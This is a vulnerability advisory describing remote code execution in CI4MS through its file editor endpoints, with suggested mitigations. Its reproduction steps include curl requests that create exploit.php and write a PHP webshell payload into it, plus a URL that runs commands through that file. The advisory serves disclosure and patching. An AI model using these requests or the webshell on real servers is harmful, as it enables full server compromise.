title: "CI4MS Vulnerable to Remote Code Execution (RCE) via Arbitrary File Creation
  and Save in File Editor"
description: "**Summary**\n\nA critical vulnerability has been identified in CI4MS
  that allows an authenticated user with file editor permissions to achieve Remote
  Code Execution (RCE). By leveraging the file creation and save endpoints, an attacker
  can upload and execute arbitrary PHP code on the server.\n\n**Vulnerability Details**\n\nThe
  vulnerability exists in the /backend/fileeditor/createFile and /backend/fileeditor/save
  API endpoints.\n\nUnrestricted File Creation: The createFile endpoint allows users
  to create files with any extension (including .php) in web-accessible directories
  such as /public.\n\nArbitrary Content Injection: The save endpoint allows users
  to write arbitrary content into the created files without sufficient server-side
  validation or sanitization.\n\nAn attacker can combine these two flaws to create
  a PHP webshell and execute system-level commands, leading to a complete compromise
  of the web server.\n\n**Impact**\n\nSuccessful exploitation allows:\n\nFull access
  to the server's file system and databases.\n\nExecution of arbitrary OS commands.\n\nPermanent
  modification or deletion of application data.\n\nSteps to Reproduce\n\nLog in to
  an account with permissions to use the file editor.\n\nCreate a new PHP file in
  a public directory using the following request:\n\n```\ncurl -X POST '[SERVER_URL]/backend/fileeditor/createFile'
  -d 'path=/public' -d 'name=exploit.php'\n```\n\nInject a PHP payload into the file
  using the save endpoint:\n\n```\ncurl -X POST '[SERVER_URL]/backend/fileeditor/save'
  -H 'Content-Type: application/json' -d '{\"path\":\"/public/exploit.php\",\"content\":\"<?php
  echo shell_exec($_GET[\\\"cmd\\\"]); ?>\"}'\n```\n\nAccess the file via the browser
  to execute commands: https://[SERVER_URL]/exploit.php?cmd=whoami\n\nSuggested Mitigation\n\nPath
  Validation: Restrict file operations to non-executable directories.\n\nExtension
  `Whitelist`ing: Strictly allow only safe file extensions (e.g., .css, .js, .txt)
  and block executable extensions like .php, .phtml, etc.\n\nContent Sanitization:
  Implement server-side checks to prevent the injection of malicious code patterns.\n\nExecution
  Prevention: Disable PHP execution in public/upload directories via server configuration
  (e.g., .htaccess or Nginx config)."
